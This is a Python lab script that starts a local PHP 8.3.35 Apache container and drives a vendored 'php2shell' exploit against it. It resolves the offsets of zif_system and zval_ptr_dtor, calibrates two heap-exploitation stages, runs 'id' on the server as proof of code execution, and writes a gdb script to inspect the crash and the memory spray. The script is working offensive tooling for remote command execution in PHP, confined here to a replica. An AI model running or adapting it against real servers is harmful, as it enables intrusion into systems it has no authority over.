#!/usr/bin/env python3
"""Forensics prep for 8.3.35: start container, calibrate, rotate, leave a
fresh worker + state file for the gdb catch. Container stays up."""
from __future__ import annotations

import json
import os
import subprocess
import sys

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))

import php2shell_calibrate as C  # noqa: E402
import php2shell_matrix as M  # noqa: E402

IMAGE = "php:8.3.35-apache"
PORT = 8094
NAME = "p2s-fs-8335"
PROFILE = os.path.join(LAB, "profiles-ours", "8.3.35-bookworm-amd64.json")
STATE = "/tmp/p2s-fs-8335.json"


def main() -> int:
    with open(PROFILE, encoding="utf-8") as fh:
        st = json.load(fh)["stages"]
    hints = {"stage1_n": st.get("stage1_n"), "stage1_len": st.get("stage1_forge_len"),
             "stage2_t": st.get("stage2_t"), "stage2_v": st.get("stage2_v", 16)}

    M.docker("rm", "-f", NAME)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", NAME))
    M.docker(
        "run", "-d", "--name", NAME,
        "-p", f"127.0.0.1:{PORT}:80",
        "-v", f"{M.LAB}/webroot:/var/www/html:ro",
        "-v", f"{M.LAB}/php.ini:/usr/local/etc/php/conf.d/zz-matrix.ini:ro",
        "-v", f"{M.LAB}/apache.conf:/etc/apache2/conf-enabled/zz-matrix.conf:ro",
        "-v", f"{outdir}:/out",
        IMAGE, timeout=900,
    )
    url = f"http://127.0.0.1:{PORT}/index.php"
    if not M.wait_http(url):
        raise SystemExit("replica did not answer")
    proof = os.path.join(outdir, "p1")

    sym = C.extract_symbols(VENDOR, NAME)
    mod = C.load_upstream(VENDOR)
    t = mod.Target(url, verbose=False)
    ex = mod.Exploit(t, "id>/out/p1", zif_offset=sym["zif_system"],
                     dtor_offset=sym["zval_ptr_dtor"], profile="bookworm",
                     verbose=False)
    print(f"[*] zif={hex(sym['zif_system'])} dtor={hex(sym['zval_ptr_dtor'])}")

    chunk, n, flen = C.calibrate_stage1(mod, ex, hints)
    if not chunk:
        print("[!] stage-1 failed")
        return 2
    lib, tidx = C.calibrate_stage2(mod, ex, sym["zval_ptr_dtor"], hints)
    if not lib:
        print("[!] stage-2 failed")
        return 2
    print(f"[*] chunk={hex(chunk)} libphp={hex(lib)}")

    ex.rotate()  # fresh deterministic worker; old one dies, new one takes over

    init_pid = int(subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Pid}}", NAME],
        capture_output=True, text=True, check=True).stdout.strip())
    kids = subprocess.run(["pgrep", "-P", str(init_pid)],
                          capture_output=True, text=True).stdout.split()
    worker = int(kids[0]) if kids else init_pid
    print(f"[*] apache parent={init_pid} worker={worker}")

    with open(STATE, "w", encoding="utf-8") as fh:
        json.dump({"chunk": chunk, "lib": lib, "zif": sym["zif_system"],
                   "dtor": sym["zval_ptr_dtor"], "worker": worker,
                   "port": PORT, "proof": proof}, fh)

    gdb = f"""set pagination off
set confirm off
set height 0
set width 0
handle SIGSEGV stop nopass print
handle SIGBUS stop nopass print
handle SIGILL stop nopass print
handle SIGFPE stop nopass print
handle SIGABRT stop nopass print
continue
printf "\\n=== SIGNAL CAUGHT ===\\n"
info registers
printf "\\n--- faulting instruction ---\\n"
x/3i $pc
printf "\\n--- what is at the aimed HTDATA ({hex(chunk)}+0x690d8) ---\\n"
x/16bx {hex(chunk + 0x690d8)}
printf "\\n--- scanning chunk for spray pattern ---\\n"
find /b1 {hex(chunk)}, {hex(chunk + 0x200000)}, 1, 0, 0, 0, 7, 0, 0, 0, 0x10, 0, 0, 0, 0xf8, 0xff, 0xff, 0xff
printf "\\n=== DONE ===\\n"
kill
quit
"""
    with open("/tmp/gdb_fs_8335.gdb", "w", encoding="utf-8") as fh:
        fh.write(gdb)
    print(f"[*] state written to {STATE}; gdb script at /tmp/gdb_fs_8335.gdb")
    return 0


if __name__ == "__main__":
    sys.exit(main())
